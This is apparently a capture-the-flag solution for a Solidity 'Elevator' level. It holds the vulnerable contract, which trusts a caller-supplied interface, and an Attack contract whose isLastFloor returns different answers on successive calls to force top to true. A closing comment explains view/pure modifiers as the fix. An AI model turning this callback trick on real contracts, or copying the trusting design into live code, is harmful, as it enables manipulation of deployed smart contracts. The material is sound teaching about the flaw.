// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

// This elevator won't let you reach the top of your building. Right?

// Things that might help:
// Sometimes solidity is not good at keeping promises.
// This Elevator expects to be used from a Building.

interface IElevator {
    function goTo(uint256) external;
}

contract Attack {
    bool isSecondTime = false;

    function isLastFloor(uint256) external returns (bool) {
        if (isSecondTime) {
            return true;
        }

        isSecondTime = true;
        return false;
    }

    function attack(address _targetContractAddress) external {
        IElevator elevator = IElevator(_targetContractAddress);

        elevator.goTo(1);
    }
}

/* 
You can use the view function modifier on an interface in order to prevent state modifications. 
The pure modifier also prevents functions from modifying the state. Make sure you read Solidity's 
documentation and learn its caveats.

An alternative way to solve this level is to build a view function which returns different 
results depends on input data but don't modify state, e.g. gasleft().
*/
